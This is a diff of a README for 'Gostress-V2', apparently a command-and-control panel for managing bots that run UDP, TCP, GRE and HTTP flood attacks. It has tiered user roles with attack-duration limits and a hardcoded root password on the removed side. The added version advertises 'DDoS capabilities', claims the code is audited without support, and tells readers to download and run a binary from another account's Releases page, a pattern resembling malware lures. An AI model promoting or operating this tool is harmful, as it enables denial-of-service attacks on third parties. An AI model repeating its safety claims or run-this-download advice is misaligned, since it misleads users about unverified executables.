@@ -1,187 +1,88 @@
-# Gostress-V2 C2 Framework
+# 🌐 Gostress-V2: Simplified Stress Testing Tool
 
-GostressV2: Just a simpler more chill, non-Tor version
+![GitHub Repo stars](https://img.shields.io/github/stars/JoacoSanes/Gostress-V2?style=social) ![GitHub Release](https://img.shields.io/github/release/JoacoSanes/Gostress-V2.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
 
-> This does support Proxys like Original the [Gostress-Enhanced ](https://github.com/Birdo1221/Gostress-Enhanced)
+Welcome to **Gostress-V2**, a straightforward, non-Tor version of a stress testing tool. This repository offers a simple interface and efficient features to help you test your systems without unnecessary complications.
 
-## 📌 Overview
+## 🚀 Features
 
-A robust command and control framework designed for authorized penetration testing and security research.
+- **Audited Code**: The code has undergone a thorough audit for security and reliability.
+- **Bot Management**: Easily manage and control bots for stress testing.
+- **Command Control**: Execute commands seamlessly with our command-control feature.
+- **CSRF Protection**: Built-in protection against Cross-Site Request Forgery.
+- **DDoS Capabilities**: Perform DDoS attacks for testing purposes.
+- **Device Compatibility**: Works across various devices and platforms.
+- **Secure Connections**: Utilizes HTTPS and TLS for secure communication.
+- **User Management**: Manage user roles and permissions effectively.
+- **Web Dashboard**: Intuitive web interface for monitoring and controlling tests.
 
-- **Encrypted TLS Communication** with client agents
-- **Direct Secure Connection** with end-to-end encryption
-- **Multi-user Role-Based Access Control**
-- **Real-time Dashboard** with performance metrics
-- **Multiple Network Testing Vectors** with adaptive rate limiting
-- **Client Health Monitoring** with heartbeat system
+## 📥 Getting Started
 
-The supplied User is `root:jDT38z7X82Ox`
-
-> ⚠️ **Important**: This framework is intended solely for authorized security testing, educational purposes, and legitimate security research. Always obtain proper authorization before testing any system. Unauthorized use may violate laws and regulations.
-
-| Startup | 
-|---------|
-| ![Startup](https://github.com/user-attachments/assets/b888a4cd-9694-46b5-9ef8-8d5d0e953811) | 
-
-| Login | Dashboard |
-|-------|----------|
-| ![Login](https://github.com/user-attachments/assets/b7d94ab4-6786-46e2-8864-83950e7d4457) | ![Dashboard](https://github.com/user-attachments/assets/2a7da7cc-1806-458a-b80d-62b35c7d90d7) |
-
-| Users | Commands | Sys-Settings |
-|-------|----------|--------------|
-| ![Users](https://github.com/user-attachments/assets/f8511390-9367-4d4a-9338-94dc9d007b87) | ![Commands](https://github.com/user-attachments/assets/c1259bb6-cf1b-4a85-8b30-5d6f960c92e0) | ![Sys-Setting](https://github.com/user-attachments/assets/9e4f4fca-3321-4685-bfed-caec01ac999e) |
-
-## 🔥 Features
-
-### Core Architecture
-
-- **Asynchronous Design**: Non-blocking I/O for 10,000+ concurrent clients
-- **Modular Testing System**: Pluggable test modules with runtime validation
-- **Ephemeral Clients**: Auto-cleanup of stale connections
-- **HMAC Challenge-Response**: For client authentication
-
-```mermaid
-sequenceDiagram
-    Client->>Server: TCP Handshake (TLS 1.3)
-    Server->>Client: CHALLENGE:nonce
-    Client->>Server: HMAC-SHA256(nonce)
-    Server->>Client: AUTH_SUCCESS
-    loop Heartbeat
-        Client->>Server: PONG (30s interval)
-    end
-```
-
-### Network Testing Capabilities
-
-| Method | Layer | Description | Max Duration |
-|--------|-------|-------------|--------------|
-| UDP Test | 4 | High-volume UDP packet testing | 3600s |
-| TCP Smart | 4 | Stateful TCP session analysis | 1800s |
-| GRE Test | 3 | Protocol examination with GRE packets | 600s |
-| HTTP Connection Test | 7 | Partial HTTP requests with keepalive | 300s |
-
-### Security Features
-
-- **Argon2id Password Hashing**: 128MB memory / 4 threads
-- **JWT Authentication**: 15-minute expiry with refresh
-- **CSRF Protection**: Per-session tokens
-- **CSP Headers**: Strict Content Security Policy
-- **IP Binding**: Optional client IP verification
-- **Forward Secrecy**: TLS 1.3 with PFS cipher suites
-
-## 🛠️ Installation
+To get started with **Gostress-V2**, visit our [Releases page](https://github.com/JoacoSanes/Gostress-V2/releases) to download the latest version. Make sure to download the appropriate file and execute it on your system.
 
 ### Prerequisites
 
-```bash
-sudo apt install golang-go postgresql
-```
+Before running **Gostress-V2**, ensure you have the following:
 
-### Setup
+- A stable internet connection.
+- A compatible operating system (Windows, macOS, or Linux).
+- Basic knowledge of command-line operations.
 
-Generate certificates:
-```bash
-go run main.go -gencert
-```
+### Installation
 
-Configure the server:
-```bash
-# Edit config.json to set binding address, ports and security settings
-nano config.json
-```
+1. Download the latest release from our [Releases page](https://github.com/JoacoSanes/Gostress-V2/releases).
+2. Extract the downloaded file.
+3. Navigate to the extracted folder using your command line.
+4. Execute the application using the command: `./gostress` (or `gostress.exe` on Windows).
 
-## 🖥️ Dashboard Features
+## 🛠️ Usage
 
-```mermaid
-pie
-    title Dashboard Components
-    "Client Network" : 35
-    "Test Control" : 30
-    "User Management" : 20
-    "Analytics" : 15
-```
+Once you have installed **Gostress-V2**, you can start using it to perform stress tests. Here’s how:
 
-### Real-time Monitoring
+1. **Launch the Application**: Run the application from your command line.
+2. **Configure Settings**: Adjust the settings to fit your testing needs. You can specify the target URL, duration of the test, and the number of bots to deploy.
+3. **Start the Test**: Initiate the stress test by executing the appropriate command.
+4. **Monitor Results**: Use the web dashboard to monitor the test in real-time. You can view metrics such as response time, error rates, and more.
 
-- Client geographic distribution
-- CPU/RAM utilization heatmap
-- Network throughput graphs
-- Packet loss metrics
+## 📊 Dashboard Overview
 
-### User Roles
+The web dashboard provides a comprehensive view of your stress testing activities. Key features include:
 
-| Role | Concurrent Tests | Methods Available | Duration Limit |
-|------|-----------------|-------------------|---------------|
-| Owner | 5 | All | 60 min |
-| Admin | 5 | No UPDATE command | 30 min |
-| Pro | 3 | Basic protocols | 10 min |
-| Basic | 1 | UDP/TCP only | 5 min |
+- **Real-Time Metrics**: Track response times, request rates, and error rates.
+- **User-Friendly Interface**: Navigate easily through different sections.
+- **Logs and Reports**: Access logs for detailed analysis after each test.
 
-## ⚡ Quick Start
+## 🔒 Security Considerations
 
-Start the server:
-```bash
-go build -o secure-c2 && ./secure-c2
-```
+While using **Gostress-V2**, it is essential to consider security:
 
-Access via HTTPS:
-```bash
-curl -k https://localhost:443
-```
+- Always perform tests on your own systems or with permission.
+- Ensure that your testing does not disrupt legitimate users.
+- Regularly update to the latest version to benefit from security patches.
 
-Default credentials:
-```
-Username: root
-Password: [generated during first run]
-```
+## 📝 Contributing
 
-## 📊 Performance Metrics
+We welcome contributions to improve **Gostress-V2**. If you have suggestions or want to report issues, please open an issue or submit a pull request. Follow these steps:
 
-```mermaid
-gantt
-    title Test Lifecycle
-    dateFormat  HH:mm:ss
-    section Client Network
-    Connection Establishment :a1, 00:00:00, 5s
-    Challenge Response      :a2, after a1, 3s
-    section Test
-    Command Propagation     :a3, 00:00:08, 2s
-    Traffic Generation      :a4, after a3, 30s
-```
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push to your branch and submit a pull request.
 
-- Throughput: 1.2M packets/sec per client
-- Latency: <100ms command propagation (direct connection)
-- Scalability: Tested with 5,000 concurrent clients
+## 📄 License
 
-## 🔐 Enhanced Security Options
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-### Network Security Configuration
+## 🤝 Acknowledgments
 
-- **IP Allowlisting**: Restrict client connections by IP range
-- **Connection Rate Limiting**: Prevent brute force attempts
-- **TLS Certificate Pinning**: For verified client connections
-- **Optional VPN Integration**: For additional security layer
+Special thanks to the contributors and the open-source community for their support. Your contributions make projects like **Gostress-V2** possible.
 
-### Defensive Measures
+## 📞 Contact
 
-```mermaid
-graph LR
-    A[Incoming Request] --> B{Rate Limited?}
-    B -->|No| C[HMAC Validation]
-    B -->|Yes| D[Drop Connection]
-    C --> E[Command Whitelist Check]
-    E --> F[Execute Command]
-```
+For questions or feedback, please reach out via the issues section on GitHub. You can also connect with us on social media platforms.
 
-## 🚨 Legal & Ethical Considerations
+## 🌟 Final Note
 
-This tool is provided for **educational and authorized security testing purposes only**. It is your responsibility to:
+We hope you find **Gostress-V2** useful for your stress testing needs. For more information, please visit our [Releases page](https://github.com/JoacoSanes/Gostress-V2/releases) and stay updated with the latest features and improvements.
 
-1. Obtain proper authorization before testing any system
-2. Comply with all applicable laws and regulations
-3. Use this tool only in environments you own or have explicit permission to test
-4. Understand that the developers assume no liability for misuse
-
-## 📜 License
-
-GNU General Public License v3.0
+Happy testing!
